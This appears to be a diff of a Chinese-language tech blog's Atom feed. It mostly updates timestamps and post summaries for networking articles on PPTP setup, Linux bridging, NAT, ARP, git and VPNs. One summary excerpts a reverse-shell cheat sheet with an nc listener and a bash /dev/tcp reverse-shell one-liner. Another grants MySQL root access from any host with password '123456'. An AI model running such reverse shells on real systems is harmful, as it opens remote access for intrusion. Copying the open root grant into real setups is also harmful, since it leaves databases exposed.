@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://demonelf.github.io/"/>
-  <updated>2019-08-29T02:18:27.862Z</updated>
+  <updated>2019-08-29T03:37:39.635Z</updated>
   <id>http://demonelf.github.io/</id>
   
   <author>
@@ -20,25 +20,15 @@
     <title>Gentoo下利用pptpd搭建PPTP服务器</title>
     <link href="http://demonelf.github.io/NETWORK/Gentoo%E4%B8%8B%E5%88%A9%E7%94%A8pptpd%E6%90%AD%E5%BB%BAPPTP%E6%9C%8D%E5%8A%A1%E5%99%A8%20.html"/>
     <id>http://demonelf.github.io/NETWORK/Gentoo下利用pptpd搭建PPTP服务器 .html</id>
-    <published>2019-08-29T02:20:06.144Z</published>
-    <updated>2019-08-29T02:18:27.862Z</updated>
+    <published>2019-08-29T03:39:48.871Z</published>
+    <updated>2019-08-29T03:37:39.635Z</updated>
     
-    <content type="html"><![CDATA[<p>首先检查当前系统的linux kernel有没有支持ppp, netfilter, mppe和 netfilter的nat,如果没有，请先配置支持这些组建，编译更新内核，然后重启系统。这块不再详述，如果想知道详细情况，可以留言问我。<br>接着安装必要软件</p><blockquote><p>emerge ppp</p><p>emerge pptpd</p></blockquote><p>然后修改配置文件<br>先是pptpd的配置文件 /etc/pptpd.conf</p><pre><code>ppp /usr/sbin/pppdoption /etc/ppp/options.pptpdlogwtmplocalip 172.16.0.1remoteip 172.16.0.2-254</code></pre><a id="more"></a><p>接着是ppp的配置文件 /etc/ppp/options.pptpd </p><pre><code>ms-dns 8.8.8.8ms-dns 8.8.4.4</code></pre><p>最后是用户密码文件 /etc/ppp/chap-secret </p><pre><code>#name server secret iptest@test.com pptpd test *</code></pre><p>第一项是登录vpn时使用的用户名，第二项是vpn服务器名（pptpd，l2tpd，xl2tpd等，也可以用*号），第三项是密码，第四项是分配给客户端的ip，如果是＊号，vpn服务器则会从自己的配置文件中选择一个ip分配给客户端。 </p><p>开启系统的封包转发： </p><blockquote><p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</p></blockquote><p>最后别忘了启动pptpd服务</p><blockquote><p>/etc/init.d/pptpd start </p></blockquote><p>gentoo下客户端示例</p><blockquote><p>pptp 192.168.2.12 user test@test.com password test</p></blockquote>]]></content>
+    <content type="html"><![CDATA[<p>首先检查当前系统的linux kernel有没有支持ppp, netfilter, mppe和 netfilter的nat,如果没有，请先配置支持这些组建，编译更新内核，然后重启系统。这块不再详述，如果想知道详细情况，可以留言问我。<br>接着安装必要软件</p><blockquote><p>emerge ppp</p><p>emerge pptpd</p></blockquote><p>然后修改配置文件<br>先是pptpd的配置文件 /etc/pptpd.conf</p><pre><code>ppp /usr/sbin/pppdoption /etc/ppp/options.pptpdlogwtmplocalip 172.16.0.1remoteip 172.16.0.2-254</code></pre><p>接着是ppp的配置文件 /etc/ppp/options.pptpd </p><pre><code>ms-dns 8.8.8.8ms-dns 8.8.4.4</code></pre><p>最后是用户密码文件 /etc/ppp/chap-secret </p><pre><code>#name server secret iptest@test.com pptpd test *</code></pre><p>第一项是登录vpn时使用的用户名，第二项是vpn服务器名（pptpd，l2tpd，xl2tpd等，也可以用*号），第三项是密码，第四项是分配给客户端的ip，如果是＊号，vpn服务器则会从自己的配置文件中选择一个ip分配给客户端。 </p><p>开启系统的封包转发： </p><blockquote><p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</p></blockquote><p>最后别忘了启动pptpd服务</p><blockquote><p>/etc/init.d/pptpd start </p></blockquote><p>gentoo下客户端示例</p><blockquote><p>pptp 192.168.2.12 user test@test.com password test</p></blockquote>]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;首先检查当前系统的linux kernel有没有支持ppp, netfilter, mppe和 netfilter的nat,如果没有，请先配置支持这些组建，编译更新内核，然后重启系统。这块不再详述，如果想知道详细情况，可以留言问我。&lt;br&gt;接着安装必要软件&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;emerge ppp&lt;/p&gt;
-&lt;p&gt;emerge pptpd&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;然后修改配置文件&lt;br&gt;先是pptpd的配置文件 /etc/pptpd.conf&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;ppp /usr/sbin/pppd
-option /etc/ppp/options.pptpd
-logwtmp
-localip 172.16.0.1
-remoteip 172.16.0.2-254
-&lt;/code&gt;&lt;/pre&gt;
+      首先检查当前系统的linux kernel有没有支持ppp, netfilter, mppe和
+netfilter的nat,如果没有，请先配置支持这些组建，编译更新内核，然后重启系统。这块不再详述，如果想知道详细情况，可以留言问我。 接着安装必要软件 e
     
     </summary>
     
@@ -60,10 +50,7 @@ remoteip 172.16.0.2-254
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;&lt;strong&gt;随着信息安全意识的提升，越来越多的信息系统前端均部署有防火墙，系统管理员根据业务需求将内部必要的服务端口通过端口映射等手段映射到公网中，如默认**&lt;/strong&gt;web&lt;strong&gt;服务端口&lt;/strong&gt;80&lt;strong&gt;、&lt;/strong&gt;MSS
-      
+      随着信息安全意识的提升，越来越多的信息系统前端均部署有防火墙，系统管理员根据业务需求将内部必要的服务端口通过端口映射等手段映射到公网中，如默认**web服务端口80、MSSQL*数据库服务端口1433等。通过部署防火墙可以将信息系统内部区域与公网逻辑隔离开
     
     </summary>
     
@@ -83,10 +70,9 @@ remoteip 172.16.0.2-254
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;​    linux bridge - (brctl)实现了ieee 802.1d协议，这个实现，应该是不能支持VLAN的功能。也就是说，这个实现，只能承载一个广播域，而不能承载多个广播域。当然，可以创建多个bridge device，每个bridge都对应不同的vlan，
-      
+      ​ linux bridge - (brctl)实现了ieee
+802.1d协议，这个实现，应该是不能支持VLAN的功能。也就是说，这个实现，只能承载一个广播域，而不能承载多个广播域。当然，可以创建多个bridge
+device，每个bridge都对应不同
     
     </summary>
     
@@ -106,11 +92,8 @@ remoteip 172.16.0.2-254
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;&lt;img src=&quot;pinkun0.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;​    现实有时就是这么无情，其实很多人不是看不清现实，只是没有勇气面对现实。我们能做的是尽量珍惜拥有，加快强化自己。当残酷到来时我们多少能从容面对。在这个由钢筋铸造的城市中，我们被磨炼的不是变的
-      
+      ​
+现实有时就是这么无情，其实很多人不是看不清现实，只是没有勇气面对现实。我们能做的是尽量珍惜拥有，加快强化自己。当残酷到来时我们多少能从容面对。在这个由钢筋铸造的城市中，我们被磨炼的不是变的无情，而是拥有钢铁般的心，更加强大而已。在这么明显的环境中，你还
     
     </summary>
     
@@ -130,22 +113,8 @@ remoteip 172.16.0.2-254
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;&lt;strong&gt;1，前提条件&lt;/strong&gt;&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;环境&lt;/th&gt;
-&lt;th&gt;系统类型&lt;/th&gt;
-&lt;th&gt;本地用户&lt;/th&gt;
-&lt;th&gt;SSH服务端口&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td
-      
+      1，前提条件 环境系统类型本地用户SSH服务端口A机位于公司的NAT网络安装在VMware里的Debian 8
+64bit虚拟机userA22B机是一台有公网IP的VPSCentOS 6 64bituserVPS1022C机位于家庭的NAT网络Windo
     
     </summary>
     
@@ -165,14 +134,8 @@ remoteip 172.16.0.2-254
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;本机开启监听：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;nc -lvnp 4444
-nc -vvlp 4444
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;目标机器开启反弹&lt;br&gt;bash版本：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;shell&quot;&gt;bash -i &amp;gt;&amp;amp; /de
-      
+      本机开启监听： nc -lvnp 4444 nc -vvlp 4444 目标机器开启反弹 bash版本： bash -i &gt;&amp;
+/dev/tcp/10.0.0.1/8080 0&gt;&amp;1 perl版本： perl -e &#39;use Socket;$
     
     </summary>
     
@@ -192,11 +155,8 @@ nc -vvlp 4444
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;简介：&lt;br&gt;前些天才知道， Linux 2.6.32 开始引入了一个 make localmodconfig 用于简化 kernel 的配置。&lt;br&gt;刚刚找了一下这个方面的资料，分享一下。&lt;/p&gt;
-&lt;p&gt;Most people uses the kernel shippe
-      
+      简介： 前些天才知道， Linux 2.6.32 开始引入了一个 make localmodconfig 用于简化 kernel 的配置。
+刚刚找了一下这个方面的资料，分享一下。 Most people uses the kernel shipped b
     
     </summary>
     
@@ -216,11 +176,8 @@ nc -vvlp 4444
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;首先配置允许访问的用户，采用授权的方式给用户权限&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;shell&quot;&gt;GRANT ALL PRIVILEGES ON *.* TO &amp;#39;root&amp;#39;@&amp;#39;%&amp;#39;IDENTIFIED BY &amp;#39;123456&amp;
-      
+      首先配置允许访问的用户，采用授权的方式给用户权限 GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;%&#39;IDENTIFIED BY
+&#39;123456&#39; WITH GRANT OPTION; 说明：root是登陆数据库的用户，
     
     </summary>
     
@@ -240,12 +197,8 @@ nc -vvlp 4444
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;先来个小忍者看看&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;metasploit.JPG&quot; alt=&quot;metasploit&quot;&gt;&lt;/p&gt;
-&lt;h2 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h
-      
+      先来个小忍者看看 环境准备 1. make.conf中添加 RUBY_TARGETS=”ruby23” 2.
+/etc/portage/package.keywords 中添加 =dev-l
     
     </summary>
     
@@ -265,13 +218,8 @@ nc -vvlp 4444
     
     <summary type="html">
     
-      
-      
-        &lt;blockquote&gt;
-&lt;p&gt;rsync -P -e ‘ssh -p 2222’ busybox-armv7l admin@192.168.2.235:/storage/emulated/0/Download/&lt;/p&gt;
-&lt;/blockquote&gt;
-
-      
+      rsync -P -e ‘ssh -p 2222’ busybox-armv7l
+admin@192.168.2.235:/storage/emulated/0/Download/
     
     </summary>
     
@@ -291,12 +239,8 @@ nc -vvlp 4444
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;&lt;img src=&quot;images/cover.png&quot; alt=&quot;cover&quot;&gt;&lt;/p&gt;
-&lt;p&gt;软件架构模式  Mark Richards 著&lt;br&gt;版权归 © 2015 O’Reilly Media, Inc. 所有.      &lt;/p&gt;
-&lt;p&gt;原书发布链接为&lt;a hre
-      
+      软件架构模式 Mark Richards 著 版权归 © 2015 O’Reilly Media, Inc. 所有. 原书发布链接为Software
+Architecture Patterns. 译员信息 本书的译员均来自 开发技术前线 www.d
     
     </summary>
     
@@ -316,12 +260,8 @@ nc -vvlp 4444
     
     <summary type="html">
     
-      
-      
-        &lt;ol&gt;
-&lt;li&gt;&lt;p&gt;平易近人。做为一个人，想受到别人的爱戴，首先自己对人就得友善，不管对任何人就应该一视同仁。&lt;/p&gt;
-&lt;p&gt; &lt;a href=&quot;http://jingyan.baidu.com/album/0320e2c1cc85031b87507b90.html?pici
-      
+      1. 平易近人。做为一个人，想受到别人的爱戴，首先自己对人就得友善，不管对任何人就应该一视同仁。 2.
+为人真诚。一个人经常的耍点小聪明，经常的觉得别人永远在自己的手掌中，那么这样的人不仅赢不了别人的喜欢，而且还
     
     </summary>
     
@@ -364,11 +304,8 @@ nc -vvlp 4444
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;&lt;img src=&quot;nat分类.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;作者：陈军链接：&lt;a href=&quot;https://www.zhihu.com/question/38729355/answer/77877260&quot; target=&quot;_blank&quot; rel=&quot;extern
-      
+      作者：陈军链接：https://www.zhihu.com/question/38729355/answer/77877260
+来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 ​ NAT分为两大类，基本的NAT和NAP
     
     </summary>
     
@@ -388,13 +325,8 @@ nc -vvlp 4444
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;配置下一跳为出接口的&lt;/p&gt;
-&lt;p&gt;好处是不用知道下一跳具体ip可以实现动态学习的效果&lt;/p&gt;
-&lt;p&gt;缺点在于下一跳路由器必须支持这种基本的arp代理功能.&lt;/p&gt;
-&lt;p&gt;拓扑图： &lt;a href=&quot;http://img1.51cto.com/attachment/2013
-      
+      配置下一跳为出接口的 好处是不用知道下一跳具体ip可以实现动态学习的效果 缺点在于下一跳路由器必须支持这种基本的arp代理功能. 拓扑图：
+以太网链路中：两个接口之间的通信是靠MAC地址，根据MAC地址，将数据封装成数据帧后传送到网络，进而通过物理
     
     </summary>
     
@@ -414,12 +346,8 @@ nc -vvlp 4444
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;使用ARP的四种典型情况&lt;/p&gt;
-&lt;p&gt;1.发送方是主机，把IP数据包发送到本网络上的另一个主机。这时用ARP找到目的主机的硬件MAC地址。  &lt;/p&gt;
-&lt;p&gt;2.发送方是主机，要把IP数据报发送到另一个网络上的主机。这时用ARP找到本网络上的一个&lt;a href=&quot;http
-      
+      使用ARP的四种典型情况 1.发送方是主机，把IP数据包发送到本网络上的另一个主机。这时用ARP找到目的主机的硬件MAC地址。
+2.发送方是主机，要把IP数据报发送到另一个网络上的主机。这时用ARP找到本网络上的一个路由器（网关）的硬件MAC地址。剩
     
     </summary>
     
@@ -439,13 +367,8 @@ nc -vvlp 4444
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;有这几个git命令就够用了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;Git常用命令图表.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;示例: 保存本地/home/example_a目录到本地/home/example_b目录&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;shell&quot;&gt;c
-      
+      有这几个git命令就够用了 示例: 保存本地/home/example_a目录到本地/home/example_b目录 cd /home/example_b
+git init --bare cd /home/example_a git init g
     
     </summary>
     
@@ -465,10 +388,7 @@ nc -vvlp 4444
     
     <summary type="html">
     
-      
-      
-        &lt;h2 id=&quot;协议规范&quot;&gt;&lt;a href=&quot;#协议规范&quot; class=&quot;headerlink&quot; title=&quot;协议规范&quot;&gt;&lt;/a&gt;协议规范&lt;/h2&gt;&lt;h2 id=&quot;实现原理&quot;&gt;&lt;a href=&quot;#实现原理&quot; class=&quot;headerlink&quot; title=&quot;实现原理&quot;&gt;&lt;/a
-      
+      协议规范 实现原理 struct ppp_info{ int unit; /**/ int dev_fd; /**/ int lcp_fd; /**/ int
     
     </summary>
     
@@ -488,13 +408,8 @@ nc -vvlp 4444
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;之前用wordpress做blog, 为什么换为hexo呢?&lt;/p&gt;
-&lt;p&gt;第一 &lt;/p&gt;
-&lt;p&gt;​    wordpress的文章都保存在服务器的数据库, 维护不是很直观.&lt;/p&gt;
-&lt;p&gt;​    而hexo是自己编写markdown文章,本地一份,而blog只是本地的映
-      
+      之前用wordpress做blog, 为什么换为hexo呢? 第一 ​ wordpress的文章都保存在服务器的数据库, 维护不是很直观. ​
+而hexo是自己编写markdown文章,本地一份,而blog只是本地的映射. ​ 这样文章更好维护和
     
     </summary>
     
@@ -514,19 +429,8 @@ nc -vvlp 4444
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;​    我们要讨论的相关vpn&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;l2tp&lt;/li&gt;
-&lt;li&gt;pptp&lt;/li&gt;
-&lt;li&gt;ipsec&lt;/li&gt;
-&lt;li&gt;websocket vpn&lt;/li&gt;
-&lt;li&gt;dns vpn&lt;/li&gt;
-&lt;li&gt;mpls vpn&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;​
-      
+      ​ 我们要讨论的相关vpn 1. l2tp 2. pptp 3. ipsec 4. websocket vpn 5. dns vpn 6. mpls vpn ​
+由于ppp协议是以上大部分vpn的核心技术,所以我们还要讨论ppp相关技术.
     
     </summary>
     
